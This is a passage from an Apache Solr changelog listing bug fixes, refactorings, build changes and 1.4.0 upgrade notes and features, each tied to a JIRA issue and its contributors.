  16. [SOLR-343](http://issues.apache.org/jira/browse/SOLR-343): Date faceting now respects facet.mincount limiting

      (Uri Boness, Raiko Eckstein via hossman)
  17. [SOLR-1624](http://issues.apache.org/jira/browse/SOLR-1624): Highlighter only highlights values from the first field value
      in a multivalued field when term positions (term vectors) are stored.

      (Chris Harris via yonik)
  18. [SOLR-1635](http://issues.apache.org/jira/browse/SOLR-1635): Fixed error message when numeric values can't be parsed by
      DOMUtils - notably for plugin init params in solrconfig.xml.

      (hossman)
  19. [SOLR-1651](http://issues.apache.org/jira/browse/SOLR-1651): Fixed Incorrect dataimport handler package name in SolrResourceLoader

      (Akshay Ukey via shalin)
  20. [SOLR-1660](http://issues.apache.org/jira/browse/SOLR-1660): CapitalizationFilter crashes if you use the maxWordCountOption

      (Robert Muir via shalin)
  21. [SOLR-1667](http://issues.apache.org/jira/browse/SOLR-1667): PatternTokenizer does not reset attributes such as positionIncrementGap

      (Robert Muir via shalin)
  22. [SOLR-1711](http://issues.apache.org/jira/browse/SOLR-1711): SolrJ - StreamingUpdateSolrServer had a race condition that
      could halt the streaming of documents. The original patch to fix this
      (never officially released) introduced another hanging bug due to
      connections not being released.

      (Attila Babo, Erik Hetzner, Johannes Tuchscherer via yonik)
  23. [SOLR-1748](http://issues.apache.org/jira/browse/SOLR-1748), [SOLR-1747](http://issues.apache.org/jira/browse/SOLR-1747), [SOLR-1746](http://issues.apache.org/jira/browse/SOLR-1746), [SOLR-1745](http://issues.apache.org/jira/browse/SOLR-1745), [SOLR-1744](http://issues.apache.org/jira/browse/SOLR-1744): Streams and Readers
      retrieved from ContentStreams are not closed in various places, resulting
      in file descriptor leaks.

      (Christoff Brill, Mark Miller)
  24. [SOLR-1753](http://issues.apache.org/jira/browse/SOLR-1753): StatsComponent throws NPE when getting statistics for facets in distributed search

      (Janne Majaranta via koji)
  25. [SOLR-1736](http://issues.apache.org/jira/browse/SOLR-1736):In the slave , If 'mov'ing file does not succeed , copy the file

      (noble)
  26. [SOLR-1579](http://issues.apache.org/jira/browse/SOLR-1579): Fixes to XML escaping in stats.jsp

      (David Bowen and hossman)
  27. [SOLR-1777](http://issues.apache.org/jira/browse/SOLR-1777): fieldTypes with sortMissingLast=true or sortMissingFirst=true can
      result in incorrectly sorted results.

      (yonik)
  28. [SOLR-1798](http://issues.apache.org/jira/browse/SOLR-1798): Small memory leak (~100 bytes) in fastLRUCache for every
      commit.

      (yonik)
  29. [SOLR-1823](http://issues.apache.org/jira/browse/SOLR-1823): Fixed XMLResponseWriter (via XMLWriter) so it no longer throws
      a ClassCastException when a Map containing a non-String key is used.

      (Frank Wesemann, hossman)
  30. [SOLR-1797](http://issues.apache.org/jira/browse/SOLR-1797): fix ConcurrentModificationException and potential memory
      leaks in ResourceLoader.

      (yonik)
  31. [SOLR-1850](http://issues.apache.org/jira/browse/SOLR-1850): change KeepWordFilter so a new word set is not created for
      each instance

      (John Wang via yonik)
  32. [SOLR-1706](http://issues.apache.org/jira/browse/SOLR-1706): fixed WordDelimiterFilter for certain combinations of options
      where it would output incorrect tokens.

      (Robert Muir, Chris Male)
  33. [SOLR-1936](http://issues.apache.org/jira/browse/SOLR-1936): The JSON response format needed to escape unicode code point
      U+2028 - 'LINE SEPARATOR'

      (Robert Hofstra, yonik)
  34. [SOLR-1914](http://issues.apache.org/jira/browse/SOLR-1914): Change the JSON response format to output float/double
      values of NaN,Infinity,-Infinity as strings.

      (yonik)
  35. [SOLR-1948](http://issues.apache.org/jira/browse/SOLR-1948): PatternTokenizerFactory should use parent's args

      (koji)
  36. [SOLR-1870](http://issues.apache.org/jira/browse/SOLR-1870): Indexing documents using the 'javabin' format no longer
      fails with a ClassCastException whenSolrInputDocuments contain field
      values which are Collections or other classes that implement
      Iterable.

      (noble, hossman)
  37. [SOLR-1981](http://issues.apache.org/jira/browse/SOLR-1981): Solr will now fail correctly if solr.xml attempts to
      specify multiple cores that have the same name

      (hossman)
  38. [SOLR-1791](http://issues.apache.org/jira/browse/SOLR-1791): Fix messed up core names on admin gui

      (yonik via koji)
  39. [SOLR-1995](http://issues.apache.org/jira/browse/SOLR-1995): Change date format from "hour in am/pm" to "hour in day"
      in CoreContainer and SnapShooter.

      (Hayato Ito, koji)
  40. [SOLR-2008](http://issues.apache.org/jira/browse/SOLR-2008): avoid possible RejectedExecutionException w/autoCommit
      by making SolreCore close the UpdateHandler before closing the
      SearchExecutor.

      (NarasimhaRaju, hossman)
  41. [SOLR-2036](http://issues.apache.org/jira/browse/SOLR-2036): Avoid expensive fieldCache ram estimation for the
      admin stats page.

      (yonik)
  42. [SOLR-2047](http://issues.apache.org/jira/browse/SOLR-2047): ReplicationHandler should accept bool type for enable flag.

      (koji)
  43. [SOLR-1630](http://issues.apache.org/jira/browse/SOLR-1630): Fix spell checking collation issue related to token positions

      (rmuir, gsingers)
  44. [SOLR-2100](http://issues.apache.org/jira/browse/SOLR-2100): The replication handler backup command didn't save the commit
      point and hence could fail when a newer commit caused the older commit point
      to be removed before it was finished being copied. This did not affect
      normal master/slave replication.

      (Peter Sturge via yonik)
  45. [SOLR-2114](http://issues.apache.org/jira/browse/SOLR-2114): Fixed parsing error in hsin function. The function signature has changed slightly.

      (gsingers)
  46. [SOLR-2083](http://issues.apache.org/jira/browse/SOLR-2083): SpellCheckComponent misreports suggestions when distributed

      (James Dyer via gsingers)
  47. [SOLR-2111](http://issues.apache.org/jira/browse/SOLR-2111): Change exception handling in distributed faceting to work more
      like non-distributed faceting, change facet\_counts/exception from a String
      to a List<String> to enable listing all exceptions that happened, and
      prevent an exception in one facet command from affecting another
      facet command.

      (yonik)
  48. [SOLR-2110](http://issues.apache.org/jira/browse/SOLR-2110): Remove the restriction on names for local params
      substitution/dereferencing. Properly encode local params in
      distributed faceting.

      (yonik)
  49. [SOLR-2135](http://issues.apache.org/jira/browse/SOLR-2135): Fix behavior of ConcurrentLRUCache when asking for
      getLatestAccessedItems(0) or getOldestAccessedItems(0).

      (David Smiley via hossman)
  50. [SOLR-2148](http://issues.apache.org/jira/browse/SOLR-2148): Highlighter doesn't support q.alt.

      (koji)
  51. [SOLR-2180](http://issues.apache.org/jira/browse/SOLR-2180): It was possible for EmbeddedSolrServer to leave searchers
      open if a request threw an exception.

      (yonik)
  52. [SOLR-2173](http://issues.apache.org/jira/browse/SOLR-2173): Suggester should always rebuild Lookup data if Lookup.load fails.

      (ab)
  53. [SOLR-2081](http://issues.apache.org/jira/browse/SOLR-2081): BaseResponseWriter.isStreamingDocs causes
      SingleResponseWriter.end to be called 2x

      (Chris A. Mattmann via hossman)
  54. [SOLR-2219](http://issues.apache.org/jira/browse/SOLR-2219): The init() method of every SolrRequestHandler was being
      called twice.

      (ambikeshwar singh and hossman)
  55. [SOLR-2285](http://issues.apache.org/jira/browse/SOLR-2285): duplicate SolrEventListeners no longer created

      (hossman)
  56. [SOLR-1993](http://issues.apache.org/jira/browse/SOLR-1993): fix String cast assumption in JavaBinCodec - specific
      addresses "commitWithin" option on Update requests.

      (noble, hossman, and Maxim Valyanskiy)
  57. [SOLR-2261](http://issues.apache.org/jira/browse/SOLR-2261): fix velocity template layout.vm that referred to an older
      version of jquery.

      (Eric Pugh via rmuir)
  58. [SOLR-2307](http://issues.apache.org/jira/browse/SOLR-2307): fix bug in PHPSerializedResponseWriter (wt=phps) when
      dealing with SolrDocumentList objects -- ie: sharded queries.

      (Antonio Verni via hossman)
  59. [SOLR-2127](http://issues.apache.org/jira/browse/SOLR-2127): Fixed serialization of default core and indentation of solr.xml when serializing.

      (Ephraim Ofir, Mark Miller)
  60. [SOLR-2320](http://issues.apache.org/jira/browse/SOLR-2320): Fixed ReplicationHandler detail reporting for masters

      (hossman)
  61. [SOLR-482](http://issues.apache.org/jira/browse/SOLR-482): Provide more exception handling in CSVLoader

      (gsingers)
  62. [SOLR-1283](http://issues.apache.org/jira/browse/SOLR-1283): HTMLStripCharFilter sometimes threw a "Mark Invalid" exception.

      (Julien Coloos, hossman, yonik)
  63. [SOLR-2085](http://issues.apache.org/jira/browse/SOLR-2085): Improve SolrJ behavior when FacetComponent comes before
      QueryComponent

      (Tomas Salfischberger via hossman)
  64. [SOLR-1940](http://issues.apache.org/jira/browse/SOLR-1940): Fix SolrDispatchFilter behavior when Content-Type is
      unknown

      (Lance Norskog and hossman)
  65. [SOLR-1983](http://issues.apache.org/jira/browse/SOLR-1983): snappuller fails when modifiedConfFiles is not empty and
      full copy of index is needed.

      (Alexander Kanarsky via yonik)
  66. [SOLR-2156](http://issues.apache.org/jira/browse/SOLR-2156): SnapPuller fails to clean Old Index Directories on Full Copy

      (Jayendra Patil via yonik)
  67. [SOLR-96](http://issues.apache.org/jira/browse/SOLR-96): Fix XML parsing in XMLUpdateRequestHandler and
      DocumentAnalysisRequestHandler to respect charset from XML file and only
      use HTTP header's "Content-Type" as a "hint".

      (uschindler)
  68. [SOLR-2339](http://issues.apache.org/jira/browse/SOLR-2339): Fix sorting to explicitly generate an error if you
      attempt to sort on a multiValued field.

      (hossman)
  69. [SOLR-2348](http://issues.apache.org/jira/browse/SOLR-2348): Fix field types to explicitly generate an error if you
      attempt to get a ValueSource for a multiValued field.

      (hossman)
  70. [SOLR-2380](http://issues.apache.org/jira/browse/SOLR-2380): Distributed faceting could miss values when facet.sort=index
      and when facet.offset was greater than 0.

      (yonik)
  71. [SOLR-1656](http://issues.apache.org/jira/browse/SOLR-1656): XIncludes and other HREFs in XML files loaded by ResourceLoader
      are fixed to be resolved using the URI standard (RFC 2396). The system
      identifier is no longer a plain filename with path, it gets initialized
      using a custom URI scheme "solrres:". This scheme is resolved using a
      EntityResolver that utilizes ResourceLoader
      (org.apache.solr.common.util.SystemIdResolver). This makes all relative
      pathes in Solr's config files behave like expected. This change
      introduces some backwards breaks in the API: Some config classes
      (Config, SolrConfig, IndexSchema) were changed to take
      org.xml.sax.InputSource instead of InputStream. There may also be some
      backwards breaks in existing config files, it is recommended to check
      your config files / XSLTs and replace all XIncludes/HREFs that were
      hacked to use absolute paths to use relative ones.

      (uschindler)
  72. [SOLR-309](http://issues.apache.org/jira/browse/SOLR-309): Fix FieldType so setting an analyzer on a FieldType that
      doesn't expect it will generate an error. Practically speaking this
      means that Solr will now correctly generate an error on
      initialization if the schema.xml contains an analyzer configuration
      for a fieldType that does not use TextField.

      (hossman)
  73. [SOLR-2192](http://issues.apache.org/jira/browse/SOLR-2192): StreamingUpdateSolrServer.blockUntilFinished was not
      thread safe and could throw an exception.

      (yonik)
  74. [SOLR-1692](http://issues.apache.org/jira/browse/SOLR-1692): Fix bug in clustering component relating to carrot.produceSummary
      option

      (gsingers)
  75. [SOLR-1756](http://issues.apache.org/jira/browse/SOLR-1756): The date.format setting for extraction request handler causes
      ClassCastException when enabled and the config code that parses this setting
      does not properly use the same iterator instance.

      (Christoph Brill, Mark Miller)
  76. [SOLR-1638](http://issues.apache.org/jira/browse/SOLR-1638): Fixed NullPointerException during DIH import if uniqueKey is not
      specified in schema

      (Akshay Ukey via shalin)
  77. [SOLR-1639](http://issues.apache.org/jira/browse/SOLR-1639): Fixed misleading error message when dataimport.properties is not
      writable

      (shalin)
  78. [SOLR-1598](http://issues.apache.org/jira/browse/SOLR-1598): DIH: Reader used in PlainTextEntityProcessor is not explicitly
      closed

      (Sascha Szott via noble)
  79. [SOLR-1759](http://issues.apache.org/jira/browse/SOLR-1759): DIH: $skipDoc was not working correctly

      (Gian Marco Tagliani via noble)
  80. [SOLR-1762](http://issues.apache.org/jira/browse/SOLR-1762): DIH: DateFormatTransformer does not work correctly with
      non-default locale dates

      (tommy chheng via noble)
  81. [SOLR-1757](http://issues.apache.org/jira/browse/SOLR-1757): DIH multithreading sometimes throws NPE

      (noble)
  82. [SOLR-1766](http://issues.apache.org/jira/browse/SOLR-1766): DIH with threads enabled doesn't respond to the abort command

      (Michael Henson via noble)
  83. [SOLR-1767](http://issues.apache.org/jira/browse/SOLR-1767): dataimporter.functions.escapeSql() does not escape backslash
      character

      (Sean Timm via noble)
  84. [SOLR-1811](http://issues.apache.org/jira/browse/SOLR-1811): formatDate should use the current NOW value always

      (Sean Timm via noble)
  85. [SOLR-1794](http://issues.apache.org/jira/browse/SOLR-1794): Dataimport of CLOB fields fails when getCharacterStream() is
      defined in a superclass.

      (Gunnar Gauslaa Bergem via rmuir)
  86. [SOLR-2057](http://issues.apache.org/jira/browse/SOLR-2057): DataImportHandler never calls UpdateRequestProcessor.finish()

      (Drew Farris via koji)
  87. [SOLR-1973](http://issues.apache.org/jira/browse/SOLR-1973): Empty fields in XML update messages confuse DataImportHandler.

      (koji)
  88. [SOLR-2221](http://issues.apache.org/jira/browse/SOLR-2221): Use StrUtils.parseBool() to get values of boolean options in DIH.
      true/on/yes (for TRUE) and false/off/no (for FALSE) can be used for
      sub-options (debug, verbose, synchronous, commit, clean, optimize) for
      full/delta-import commands.

      (koji)
  89. [SOLR-2310](http://issues.apache.org/jira/browse/SOLR-2310): DIH: getTimeElapsedSince() returns incorrect hour value when
      the elapse is over 60 hours

      (tom liu via koji)
  90. [SOLR-2252](http://issues.apache.org/jira/browse/SOLR-2252): DIH: When a child entity in nested entities is rootEntity="true",
      delta-import doesn't work.

      (koji)
  91. [SOLR-2330](http://issues.apache.org/jira/browse/SOLR-2330): solrconfig.xml files in example-DIH are broken.

      (Matt Parker, koji)
  92. [SOLR-1191](http://issues.apache.org/jira/browse/SOLR-1191): resolve DataImportHandler deltaQuery column against pk when pk
      has a prefix (e.g. pk="book.id" deltaQuery="select id from ..."). More
      useful error reporting when no match found (previously failed with a
      NullPointerException in log and no clear user feedback).

      (gthb via yonik)
  93. [SOLR-2116](http://issues.apache.org/jira/browse/SOLR-2116): Fix TikaConfig classloader bug in TikaEntityProcessor

      (Martijn van Groningen via hossman)
+ Other Changes   (43)
  1. [SOLR-1602](http://issues.apache.org/jira/browse/SOLR-1602): Refactor SOLR package structure to include o.a.solr.response
     and move QueryResponseWriters in there

     (Chris A. Mattmann, ryan, hoss)
  2. [SOLR-1516](http://issues.apache.org/jira/browse/SOLR-1516): Addition of an abstract BaseResponseWriter class to simplify the
     development of QueryResponseWriter implementations.

     (Chris A. Mattmann via noble)
  3. [SOLR-1592](http://issues.apache.org/jira/browse/SOLR-1592): Refactor XMLWriter startTag to allow arbitrary attributes to be written

     (Chris A. Mattmann via noble)
  4. [SOLR-1561](http://issues.apache.org/jira/browse/SOLR-1561): Added Lucene 2.9.1 spatial contrib jar to lib.

     (gsingers)
  5. [SOLR-1570](http://issues.apache.org/jira/browse/SOLR-1570): Log warnings if uniqueKey is multi-valued or not stored

     (hossman, shalin)
  6. [SOLR-1558](http://issues.apache.org/jira/browse/SOLR-1558): QueryElevationComponent only works if the uniqueKey field is
     implemented using StrField. In previous versions of Solr no warning or
     error would be generated if you attempted to use QueryElevationComponent,
     it would just fail in unexpected ways. This has been changed so that it
     will fail with a clear error message on initialization.

     (hossman)
  7. [SOLR-1611](http://issues.apache.org/jira/browse/SOLR-1611): Added Lucene 2.9.1 collation contrib jar to lib

     (shalin)
  8. [SOLR-1608](http://issues.apache.org/jira/browse/SOLR-1608): Extract base class from TestDistributedSearch to make
     it easy to write test cases for other distributed components.

     (shalin)
  9. Upgraded to Lucene 2.9-dev r888785

     (shalin)
  10. [SOLR-1610](http://issues.apache.org/jira/browse/SOLR-1610): Generify SolrCache

      (Jason Rutherglen via shalin)
  11. [SOLR-1637](http://issues.apache.org/jira/browse/SOLR-1637): Remove ALIAS command
  12. [SOLR-1662](http://issues.apache.org/jira/browse/SOLR-1662): Added Javadocs in BufferedTokenStream and fixed incorrect cloning
      in TestBufferedTokenStream

      (Robert Muir, Uwe Schindler via shalin)
  13. [SOLR-1674](http://issues.apache.org/jira/browse/SOLR-1674): Improve analysis tests and cut over to new TokenStream API.

      (Robert Muir via Mark Miller)
  14. [SOLR-1661](http://issues.apache.org/jira/browse/SOLR-1661): Remove adminCore from CoreContainer . removed deprecated methods setAdminCore(), getAdminCore()

      (noble)
  15. [SOLR-1704](http://issues.apache.org/jira/browse/SOLR-1704): Google collections moved from clustering to core

      (noble)
  16. [SOLR-1268](http://issues.apache.org/jira/browse/SOLR-1268): Add Lucene 2.9-dev r888785 FastVectorHighlighter contrib jar to lib.

      (koji)
  17. [SOLR-1538](http://issues.apache.org/jira/browse/SOLR-1538): Reordering of object allocations in ConcurrentLRUCache to eliminate
      (an extremely small) potential for deadlock.

      (gabriele renzi via hossman)
  18. [SOLR-1588](http://issues.apache.org/jira/browse/SOLR-1588): Removed some very old dead code.

      (Chris A. Mattmann via hossman)
  19. [SOLR-1696](http://issues.apache.org/jira/browse/SOLR-1696) : Deprecate old <highlighting> syntax and move configuration to HighlightComponent

      (noble)
  20. [SOLR-1727](http://issues.apache.org/jira/browse/SOLR-1727): SolrEventListener should extend NamedListInitializedPlugin

      (noble)
  21. [SOLR-1771](http://issues.apache.org/jira/browse/SOLR-1771): Improved error message when StringIndex cannot be initialized
      for a function query

      (hossman)
  22. [SOLR-1695](http://issues.apache.org/jira/browse/SOLR-1695): Improved error messages when adding a document that does not
      contain exactly one value for the uniqueKey field

      (hossman)
  23. [SOLR-1776](http://issues.apache.org/jira/browse/SOLR-1776): DismaxQParser and ExtendedDismaxQParser now use the schema.xml
      "defaultSearchField" as the default value for the "qf" param instead of failing
      with an error when "qf" is not specified.

      (hossman)
  24. [SOLR-1851](http://issues.apache.org/jira/browse/SOLR-1851): luceneAutoCommit no longer has any effect - it has been remove

      (Mark Miller)
  25. [SOLR-1865](http://issues.apache.org/jira/browse/SOLR-1865): SolrResourceLoader.getLines ignores Byte Order Markers (BOMs) at the
      beginning of input files, these are often created by editors such as Windows
      Notepad.

      (rmuir, hossman)
  26. [SOLR-1938](http://issues.apache.org/jira/browse/SOLR-1938): ElisionFilterFactory will use a default set of French contractions
      if you do not supply a custom articles file.

      (rmuir)
  27. [SOLR-2003](http://issues.apache.org/jira/browse/SOLR-2003): SolrResourceLoader will report any encoding errors, rather than
      silently using replacement characters for invalid inputs

      (blargy via rmuir)
  28. [SOLR-1804](http://issues.apache.org/jira/browse/SOLR-1804): Google collections updated to Google Guava (which is a superset of collections and contains bug fixes)

      (gsingers)
  29. [SOLR-2034](http://issues.apache.org/jira/browse/SOLR-2034): Switch to JavaBin codec version 2. Strings are now serialized
      as the number of UTF-8 bytes, followed by the bytes in UTF-8. Previously
      Strings were serialized as the number of UTF-16 chars, followed by the
      bytes in Modified UTF-8.

      (hossman, yonik, rmuir)
  30. [SOLR-2013](http://issues.apache.org/jira/browse/SOLR-2013): Add mapping-FoldToASCII.txt to example conf directory.

      (Steven Rowe via koji)
  31. [SOLR-2213](http://issues.apache.org/jira/browse/SOLR-2213): Upgrade to jQuery 1.4.3

      (Erick Erickson via ryan)
  32. [SOLR-1826](http://issues.apache.org/jira/browse/SOLR-1826): Add unit tests for highlighting with termOffsets=true
      and overlapping tokens.

      (Stefan Oestreicher via rmuir)
  33. [SOLR-2340](http://issues.apache.org/jira/browse/SOLR-2340): Add version infos to message in JavaBinCodec when throwing
      exception.

      (koji)
  34. [SOLR-2350](http://issues.apache.org/jira/browse/SOLR-2350): Since Solr no longer requires XML files to be in UTF-8
      (see [SOLR-96](http://issues.apache.org/jira/browse/SOLR-96)) SimplePostTool (aka: post.jar) has been improved to
      work with files of any mime-type or charset.

      (hossman)
  35. [SOLR-2365](http://issues.apache.org/jira/browse/SOLR-2365): Move DIH jars out of solr.war

      (David Smiley via yonik)
  36. [SOLR-2381](http://issues.apache.org/jira/browse/SOLR-2381): Include a patched version of Jetty (6.1.26 + JETTY-1340)
      to fix problematic UTF-8 handling for supplementary characters.

      (Bernd Fehling, uschindler, yonik, rmuir)
  37. [SOLR-2391](http://issues.apache.org/jira/browse/SOLR-2391): The preferred Content-Type for XML was changed to
      application/xml. XMLResponseWriter now only delivers using this
      type; updating documents and analyzing documents is still supported
      using text/xml as Content-Type, too. If you have clients that are
      hardcoded on text/xml as Content-Type, you have to change them.

      (uschindler, rmuir)
  38. [SOLR-2414](http://issues.apache.org/jira/browse/SOLR-2414): All ResponseWriters now use only ServletOutputStreams
      and wrap their own Writer around it when serializing. This fixes
      the bug in PHPSerializedResponseWriter that produced wrong string
      length if the servlet container had a broken UTF-8 encoding that was
      in fact CESU-8 (see [SOLR-1091](http://issues.apache.org/jira/browse/SOLR-1091)). The system property to enable the
      CESU-8 byte counting in PHPSerializesResponseWriters for broken
      servlet containers was therefore removed and is now ignored if set.
      Output is always UTF-8.

      (uschindler, yonik, rmuir)
  39. [SOLR-141](http://issues.apache.org/jira/browse/SOLR-141): Errors and Exceptions are formated by ResponseWriter.

      (Mike Sokolov, Rich Cariens, Daniel Naber, ryan)
  40. [SOLR-1902](http://issues.apache.org/jira/browse/SOLR-1902): Upgraded to Tika 0.8 and changed deprecated parse call
  41. [SOLR-1813](http://issues.apache.org/jira/browse/SOLR-1813): Add ICU4j to contrib/extraction libs and add tests for Arabic
      extraction

      (Robert Muir via gsingers)
  42. [SOLR-1821](http://issues.apache.org/jira/browse/SOLR-1821): Fix TimeZone-dependent test failure in TestEvaluatorBag.

      (Chris Male via rmuir)
  43. [SOLR-2367](http://issues.apache.org/jira/browse/SOLR-2367): Reduced noise in test output by ensuring the properties file
      can be written.

      (Gunnlaugur Thor Briem via rmuir)
+ Build   (5)
  1. [SOLR-1522](http://issues.apache.org/jira/browse/SOLR-1522): Automated release signing process.

     (gsingers)
  2. [SOLR-1891](http://issues.apache.org/jira/browse/SOLR-1891): Make lucene-jars-to-solr fail if copying any of the jars fails, and
     update clean to remove the jars in that directory

     (Mark Miller)
  3. [LUCENE-2466](http://issues.apache.org/jira/browse/LUCENE-2466): Commons-Codec was upgraded from 1.3 to 1.4.

     (rmuir)
  4. [SOLR-2042](http://issues.apache.org/jira/browse/SOLR-2042): Fixed some Maven deps

     (Drew Farris via gsingers)
  5. [LUCENE-2657](http://issues.apache.org/jira/browse/LUCENE-2657): Switch from using Maven POM templates to full POMs when
     generating Maven artifacts

     (Steven Rowe)
+ Documentation   (2)
  1. [SOLR-1590](http://issues.apache.org/jira/browse/SOLR-1590): Javadoc for XMLWriter#startTag

     (Chris A. Mattmann via hossman)
  2. [SOLR-1792](http://issues.apache.org/jira/browse/SOLR-1792): Documented peculiar behavior of TestHarness.LocalRequestFactory

     (hossman)

### Release 1.4.0 [2009-11-10]

+ Release Date: See <http://lucene.apache.org/solr> for the official release date.
+ Upgrading from Solr 1.3   (12)
  1. There is a new default faceting algorithm for multiVaued fields that should be
     faster for most cases. One can revert to the previous algorithm (which has
     also been improved somewhat) by adding facet.method=enum to the request.
  2. Searching and sorting is now done on a per-segment basis, meaning that
     the FieldCache entries used for sorting and for function queries are
     created and used per-segment and can be reused for segments that don't
     change between index updates. While generally beneficial, this can lead
     to increased memory usage over 1.3 in certain scenarios:
     1) A single valued field that was used for both sorting and faceting
     in 1.3 would have used the same top level FieldCache entry. In 1.4,
     sorting will use entries at the segment level while faceting will still
     use entries at the top reader level, leading to increased memory usage.
     2) Certain function queries such as ord() and rord() require a top level
     FieldCache instance and can thus lead to increased memory usage. Consider
     replacing ord() and rord() with alternatives, such as function queries
     based on ms() for date boosting.
  3. If you use custom Tokenizer or TokenFilter components in a chain specified in
     schema.xml, they must support reusability. If your Tokenizer or TokenFilter
     maintains state, it should implement reset(). If your TokenFilteFactory does
     not return a subclass of TokenFilter, then it should implement reset() and call
     reset() on it's input TokenStream. TokenizerFactory implementations must
     now return a Tokenizer rather than a TokenStream.
  4. New users of Solr 1.4 will have omitTermFreqAndPositions enabled for non-text
     indexed fields by default, which avoids indexing term frequency, positions, and
     payloads, making the index smaller and faster. If you are upgrading from an
     earlier Solr release and want to enable omitTermFreqAndPositions by default,
     change the schema version from 1.1 to 1.2 in schema.xml. Remove any existing
     index and restart Solr to ensure that omitTermFreqAndPositions completely takes
     affect.
  5. The default QParserPlugin used by the QueryComponent for parsing the "q" param
     has been changed, to remove support for the deprecated use of ";" as a separator
     between the query string and the sort options when no "sort" param was used.
     Users who wish to continue using the semi-colon based method of specifying the
     sort options should explicitly set the defType param to "lucenePlusSort" on all
     requests. (The simplest way to do this is by specifying it as a default param
     for your request handlers in solrconfig.xml, see the example solrconfig.xml for
     sample syntax.)
  6. If spellcheck.extendedResults=true, the response format for suggestions
     has changed, see [SOLR-1071](http://issues.apache.org/jira/browse/SOLR-1071).
  7. Use of the "charset" option when configuring the following Analysis
     Factories has been deprecated and will cause a warning to be logged.
     In future versions of Solr attempting to use this option will cause an
     error. See [SOLR-1410](http://issues.apache.org/jira/browse/SOLR-1410) for more information.
     - GreekLowerCaseFilterFactory
     - RussianStemFilterFactory
     - RussianLowerCaseFilterFactory
     - RussianLetterTokenizerFactory
  8. DIH: Evaluator API has been changed in a non back-compatible way. Users who
     have developed custom Evaluators will need to change their code according to
     the new API for it to work. See [SOLR-996](http://issues.apache.org/jira/browse/SOLR-996) for details.
  9. DIH: The formatDate evaluator's syntax has been changed. The new syntax is
     formatDate(<variable>, '<format\_string>'). For example,
     formatDate(x.date, 'yyyy-MM-dd'). In the old syntax, the date string was
     written without a single-quotes. The old syntax has been deprecated and will
     be removed in 1.5, until then, using the old syntax will log a warning.
  10. DIH: The Context API has been changed in a non back-compatible way. In
      particular, the Context.currentProcess() method now returns a String
      describing the type of the current import process instead of an int.
      Similarily, the public constants in Context viz. FULL\_DUMP, DELTA\_DUMP and
      FIND\_DELTA are changed to a String type. See [SOLR-969](http://issues.apache.org/jira/browse/SOLR-969) for details.
  11. DIH: The EntityProcessor API has been simplified by moving logic for applying
      transformers and handling multi-row outputs from Transformers into an
      EntityProcessorWrapper class. The EntityProcessor#destroy is now called once
      per parent-row at the end of row (end of data). A new method
      EntityProcessor#close is added which is called at the end of import.
  12. DIH: In Solr 1.3, if the last\_index\_time was not available (first import) and
      a delta-import was requested, a full-import was run instead. This is no longer
      the case. In Solr 1.4 delta import is run with last\_index\_time as the epoch
      date (January 1, 1970, 00:00:00 GMT) if last\_index\_time is not available.
+ Versions of Major Components   (3)
  1. Apache Lucene 2.9.1

     (r832363 on 2.9 branch)
  2. Apache Tika 0.4
  3. Carrot2 3.1.0
+ Lucene Information   (1)
  1. Since Solr is built on top of Lucene, many people add customizations to Solr
     that are dependent on Lucene. Please see [http://lucene.apache.org/java/2\_9\_0/,](http://lucene.apache.org/java/2_9_0/%2C)
     especially <http://lucene.apache.org/java/2_9_0/changes/Changes.html> for more
     information on the version of Lucene used in Solr.
#### Detailed Change List

+ New Features   (124)
  1. [SOLR-560](http://issues.apache.org/jira/browse/SOLR-560): Use SLF4J logging API rather then JDK logging. The packaged .war file is
     shipped with a JDK logging implementation, so logging configuration for the .war should
     be identical to solr 1.3. However, if you are using the .jar file, you can select
     which logging implementation to use by dropping a different binding.
     See: <http://www.slf4j.org/>

     (ryan)
  2. [SOLR-617](http://issues.apache.org/jira/browse/SOLR-617): Allow configurable index deletion policy and provide a default implementation which
     allows deletion of commit points on various criteria such as number of commits, age of commit
     point and optimized status.
     See <http://lucene.apache.org/java/2_3_2/api/org/apache/lucene/index/IndexDeletionPolicy.html>

     (yonik, Noble Paul, Akshay Ukey via shalin)
  3. [SOLR-658](http://issues.apache.org/jira/browse/SOLR-658): Allow Solr to load index from arbitrary directory in dataDir

     (Noble Paul, Akshay Ukey via shalin)
  4. [SOLR-793](http://issues.apache.org/jira/browse/SOLR-793): Add 'commitWithin' argument to the update add command. This behaves
     similar to the global autoCommit maxTime argument except that it is set for
     each request.

     (ryan)
  5. [SOLR-670](http://issues.apache.org/jira/browse/SOLR-670): Add support for rollbacks in UpdateHandler. This allows user to rollback all changes
     since the last commit.

     (Noble Paul, koji via shalin)
  6. [SOLR-813](http://issues.apache.org/jira/browse/SOLR-813): Adding DoubleMetaphone Filter and Factory. Similar to the PhoneticFilter,
     but this uses DoubleMetaphone specific calls (including alternate encoding)

     (Todd Feak via ryan)
  7. [SOLR-680](http://issues.apache.org/jira/browse/SOLR-680): Add StatsComponent. This gets simple statistics on matched numeric fields,
     including: min, max, mean, median, stddev.

     (koji, ryan)
     - [SOLR-1380](http://issues.apache.org/jira/browse/SOLR-1380): Added support for multi-valued fields

       (Harish Agarwal via gsingers)
  8. [SOLR-561](http://issues.apache.org/jira/browse/SOLR-561): Added Replication implemented in Java as a request handler. Supports index replication
     as well as configuration replication and exposes detailed statistics and progress information
     on the Admin page. Works on all platforms.

     (Noble Paul, yonik, Akshay Ukey, shalin)
  9. [SOLR-746](http://issues.apache.org/jira/browse/SOLR-746): Added "omitHeader" request parameter to omit the header from the response.

     (Noble Paul via shalin)
  10. [SOLR-651](http://issues.apache.org/jira/browse/SOLR-651): Added TermVectorComponent for serving up term vector information, plus IDF.
      See <http://wiki.apache.org/solr/TermVectorComponent>

      (gsingers, Vaijanath N. Rao, Noble Paul)
  11. [SOLR-795](http://issues.apache.org/jira/browse/SOLR-795): SpellCheckComponent supports building indices on optimize if configured in solrconfig.xml

      (Jason Rennie, shalin)
  12. [SOLR-667](http://issues.apache.org/jira/browse/SOLR-667): A LRU cache implementation based upon ConcurrentHashMap and other techniques to reduce
      contention and synchronization overhead, to utilize multiple CPU cores more effectively.

      (Fuad Efendi, Noble Paul, yonik via shalin)
  13. [SOLR-465](http://issues.apache.org/jira/browse/SOLR-465): Add configurable DirectoryProvider so that alternate Directory
      implementations can be specified via solrconfig.xml. The default
      DirectoryProvider will use NIOFSDirectory for better concurrency
      on non Windows platforms.

      (Mark Miller, TJ Laurenzo via yonik)
  14. [SOLR-822](http://issues.apache.org/jira/browse/SOLR-822): Add CharFilter so that characters can be filtered (e.g. character normalization)
      before Tokenizer/TokenFilters.

      (koji)
